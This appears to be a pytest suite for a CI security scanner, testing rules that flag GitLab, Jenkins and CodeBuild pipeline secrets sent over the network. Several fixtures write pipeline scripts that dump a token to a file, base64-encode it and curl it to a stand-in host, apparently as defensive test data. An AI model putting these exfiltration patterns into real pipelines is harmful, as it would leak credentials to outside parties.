"""Authored GitLab/Jenkins contrasts; these do not measure field accuracy."""

from __future__ import annotations

from pathlib import Path

import pytest

from taintly.engine import scan_file
from taintly.models import IncompletePatternMatches, Platform, Severity
from taintly.rules.codebuild.secret_network_flow import CodeBuildSecretNetworkPattern
from taintly.rules.gitlab.secret_network_flow import GitLabSecretNetworkPattern
from taintly.rules.jenkins.secret_network_flow import JenkinsSecretNetworkPattern
from taintly.rules.registry import load_rules_for_platform
from taintly.testing.mutations import mutate_quote_swap, mutate_whitespace_pad


def _gitlab(tmp_path: Path, script: str, *, extra: str = "") -> Path:
    path = tmp_path / ".gitlab-ci.yml"
    path.write_text(
        "stages: [audit]\naudit:\n  stage: audit\n"
        + extra
        + "  script:\n    - |\n"
        + "".join(f"      {row}\n" for row in script.splitlines()),
        encoding="utf8",
    )
    return path


def _jenkins(tmp_path: Path, script: str, *, outside: bool = False) -> Path:
    path = tmp_path / "Jenkinsfile"
    bound = (
        "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
        f"  sh '''{script}'''\n"
        "}\n"
    )
    if outside:
        bound = (
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n  sh 'echo ready'\n}\n"
            + f"sh '''{script}'''\n"
        )
    path.write_text(bound, encoding="utf8")
    return path


def _codebuild(
    tmp_path: Path, script: str, *, version: str = "0.2", shell: str = "bash", extra: str = ""
) -> Path:
    path = tmp_path / "buildspec.yml"
    path.write_text(
        f"version: {version}\nenv:\n  shell: {shell}\n"
        "  secrets-manager:\n    TOKEN: prod/token\n"
        + extra
        + "phases:\n  build:\n    commands:\n      - |\n"
        + "".join(f"        {row}\n" for row in script.splitlines()),
        encoding="utf8",
    )
    return path


def _matches(path: Path, platform: Platform):
    source = path.read_text(encoding="utf8")
    pattern: (
        GitLabSecretNetworkPattern | JenkinsSecretNetworkPattern | CodeBuildSecretNetworkPattern
    )
    if platform is Platform.GITLAB:
        pattern = GitLabSecretNetworkPattern()
    elif platform is Platform.JENKINS:
        pattern = JenkinsSecretNetworkPattern()
    else:
        pattern = CodeBuildSecretNetworkPattern()
    return pattern.check_with_filepath(source, source.splitlines(), str(path))


@pytest.mark.parametrize(
    ("platform", "builder", "variable", "rule_id"),
    [
        (Platform.GITLAB, _gitlab, "CI_JOB_TOKEN", "SEC6-GL-010"),
        (Platform.JENKINS, _jenkins, "TOKEN", "SEC6-JK-012"),
        (Platform.CODEBUILD, _codebuild, "TOKEN", "SEC6-CB-003"),
    ],
)
def test_source_to_file_base64_to_body_through_engine(
    tmp_path: Path, platform: Platform, builder, variable: str, rule_id: str
) -> None:
    path = builder(
        tmp_path,
        f'echo "${variable}" > token.txt\nbase64 -w0 token.txt > payload.txt\n'
        "curl https://example.test/collect --data-binary @payload.txt",
    )
    findings = scan_file(str(path), load_rules_for_platform(platform))
    selected = [finding for finding in findings if finding.rule_id == rule_id]
    assert len(selected) == 1
    assert selected[0].severity is Severity.MEDIUM
    assert selected[0].review_needed
    notes = " ".join(selected[0].context_notes)
    assert "base64-file-transform" in notes
    assert "delivery are unknown" in notes


@pytest.mark.parametrize(
    ("platform", "builder", "variable"),
    [
        (Platform.GITLAB, _gitlab, "CI_JOB_TOKEN"),
        (Platform.JENKINS, _jenkins, "TOKEN"),
        (Platform.CODEBUILD, _codebuild, "TOKEN"),
    ],
)
@pytest.mark.parametrize(
    "script",
    [
        'curl https://example.test/api -H "Authorization: Bearer ${variable}" --data status=ready',
        "curl https://example.test/collect --data '${variable}'",
        'echo "${variable}" > token.txt\ncurl https://example.test/api --data-binary @other.txt',
        'echo "${variable}" > token.txt\necho public > token.txt\ncurl https://example.test/api --data-binary @token.txt',
        'echo "${variable}" > token.txt\nsource ./unknown.sh\ncurl https://example.test/api --data-binary @token.txt',
        '${name}=public\ncurl https://example.test/api --data "${variable}"',
    ],
)
def test_auth_literal_unrelated_overwrite_and_unknown_do_not_claim_flow(
    tmp_path: Path, platform: Platform, builder, variable: str, script: str
) -> None:
    script = script.replace("${variable}", "$" + variable).replace("${name}", variable)
    assert not _matches(builder(tmp_path, script), platform)


def test_gitlab_override_or_predecessor_is_unresolved(tmp_path: Path) -> None:
    path = _gitlab(
        tmp_path,
        'curl https://example.test/collect --data "$CI_JOB_TOKEN"',
        extra="  variables:\n    CI_JOB_TOKEN: public\n",
    )
    result = _matches(path, Platform.GITLAB)
    assert isinstance(result, IncompletePatternMatches)
    assert not result

    path = _gitlab(
        tmp_path,
        'curl https://example.test/collect --data "$CI_JOB_TOKEN"',
        extra="  before_script:\n    - CI_JOB_TOKEN=public\n",
    )
    assert isinstance(_matches(path, Platform.GITLAB), IncompletePatternMatches)


def test_gitlab_cross_item_file_path_is_unresolved(tmp_path: Path) -> None:
    path = tmp_path / ".gitlab-ci.yml"
    path.write_text(
        "audit:\n  script:\n"
        '    - |\n      echo "$CI_JOB_TOKEN" > token.txt\n'
        "    - |\n      curl https://example.test/collect --data-binary @token.txt\n",
        encoding="utf8",
    )
    result = _matches(path, Platform.GITLAB)
    assert isinstance(result, IncompletePatternMatches)
    assert not result


def test_jenkins_binding_outside_shell_is_unresolved(tmp_path: Path) -> None:
    path = _jenkins(tmp_path, 'curl https://example.test/collect --data "$TOKEN"', outside=True)
    result = _matches(path, Platform.JENKINS)
    assert isinstance(result, IncompletePatternMatches)
    assert not result


@pytest.mark.parametrize(
    ("version", "shell", "extra"),
    [
        ("0.1", "bash", ""),
        ("0.2", "powershell.exe", ""),
        ("0.2", "bash", "  variables:\n    TOKEN: public\n"),
    ],
)
def test_codebuild_version_shell_and_source_override_remain_unresolved(
    tmp_path: Path, version: str, shell: str, extra: str
) -> None:
    path = _codebuild(
        tmp_path,
        'curl https://example.test/collect --data "$TOKEN"',
        version=version,
        shell=shell,
        extra=extra,
    )
    result = _matches(path, Platform.CODEBUILD)
    assert isinstance(result, IncompletePatternMatches)
    assert not result


@pytest.mark.parametrize(
    ("platform", "builder", "variable", "pattern"),
    [
        (Platform.GITLAB, _gitlab, "CI_JOB_TOKEN", GitLabSecretNetworkPattern),
        (Platform.JENKINS, _jenkins, "TOKEN", JenkinsSecretNetworkPattern),
        (Platform.CODEBUILD, _codebuild, "TOKEN", CodeBuildSecretNetworkPattern),
    ],
)
def test_unbound_or_changed_source_is_not_a_completed_negative(
    tmp_path: Path, platform: Platform, builder, variable: str, pattern
) -> None:
    path = builder(tmp_path, f'curl https://example.test/collect --data "${variable}"')
    source = path.read_text(encoding="utf8")
    assert isinstance(pattern().check(source, source.splitlines()), IncompletePatternMatches)
    changed = source.replace("collect", "different")
    result = pattern().check_with_filepath(changed, changed.splitlines(), str(path))
    assert isinstance(result, IncompletePatternMatches)
    assert not result


def test_mutation_skips_only_demonstrated_semantic_changes() -> None:
    from taintly.rules.gitlab.secret_network_flow import RULES as gl_rules
    from taintly.rules.jenkins.secret_network_flow import RULES as jk_rules

    gl_source = gl_rules[0].test_positive[0]
    gl_pattern = GitLabSecretNetworkPattern()
    assert not gl_pattern.self_test_mutation_applicable(
        gl_source, gl_source.replace(": ", ":"), "whitespace_pad"
    )
    assert gl_pattern.self_test_mutation_applicable(
        gl_source, gl_source.replace(": ", ":  "), "whitespace_pad"
    )

    jk_source = jk_rules[0].test_positive[0]
    jk_pattern = JenkinsSecretNetworkPattern()
    changed = next(item for item in mutate_quote_swap(jk_source) if 'sh """' in item)
    assert not jk_pattern.self_test_mutation_applicable(jk_source, changed, "quote_swap")
    for mutant in mutate_whitespace_pad(jk_source):
        assert jk_pattern.self_test_mutation_applicable(jk_source, mutant, "whitespace_pad")
